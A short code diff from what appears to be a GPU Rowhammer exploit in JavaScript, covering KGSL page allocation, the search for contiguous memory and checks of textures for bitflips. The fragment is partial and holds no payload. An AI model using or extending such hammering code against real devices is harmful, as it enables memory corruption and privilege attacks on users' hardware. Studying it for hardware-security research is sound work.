@@ -8,16 +8,8 @@ async function glitch() {
     initFramebuffer();
     
     allocatePages(PAGES_PER_MB * 32);
-    const allocator = new Allocator(PAGES_PER_MB * 4);
+    const allocator = new Allocator(PAGES_PER_MB * 192);
     await allocator._init(0);
-    
-    console.log(await readPtr(allocator.newKGSL[7].v_addr))
-    console.log(await readPtr(allocator.newKGSL[8].v_addr))
-    console.log(await readPtr(allocator.newKGSL[16].v_addr))
-    console.log(await readPtr(allocator.newKGSL[1000].v_addr))
-    console.log(await readPtr(allocator.newKGSL[2435].v_addr))
-    console.log(await readTexture(allocator.newKGSL[2435].v_addr))
-    // return;
     
     const contPages = allocator.SearchContPages();
     // const contPages = mockContPages(10)
@@ -134,8 +126,10 @@ async function hammerTime(contMem) {
             // viewFramebuffer();
 
             await sleep(100); // flushes console log
-            checkForFlip(contMem[offset + 16].texture);
-            checkForFlip(contMem[offset + 17].texture);
+            // checkForFlip(contMem[offset + 16].texture);
+            // checkForFlip(contMem[offset + 17].texture);
+            doubleCheckForFlip(contMem[offset + 16]);
+            doubleCheckForFlip(contMem[offset + 17]);
             console.log(`++ Checked [${offset + 16}] [${offset + 17}] for bitflips.`);
         }
 
